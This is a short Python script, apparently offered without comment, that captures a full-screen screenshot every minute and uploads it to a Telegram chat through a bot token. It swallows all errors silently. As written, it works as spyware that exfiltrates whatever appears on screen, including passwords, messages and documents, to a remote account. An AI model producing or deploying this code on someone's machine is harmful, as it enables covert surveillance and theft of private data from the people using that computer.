import time
import requests
import pyautogui
from decouple import config

def main():
  photo = 'screenshot.png'
  while 1:
    screenshot = pyautogui.screenshot()
    screenshot.save(photo)
    sendPhoto(photo, config('CHAT_ID'))
    screenshot.close()
    time.sleep(1 * 60)

def sendPhoto(photo: str, chatId: str):
    try:
        url = f'https://api.telegram.org/bot{config("TELEGRAM_BOT_TOKEN")}/sendPhoto'
        files = {'photo': open(photo, 'rb')}
        data = {'chat_id': chatId}
        response = requests.post(url, files=files, data=data)
    except Exception as e:
        _ = 0

main()
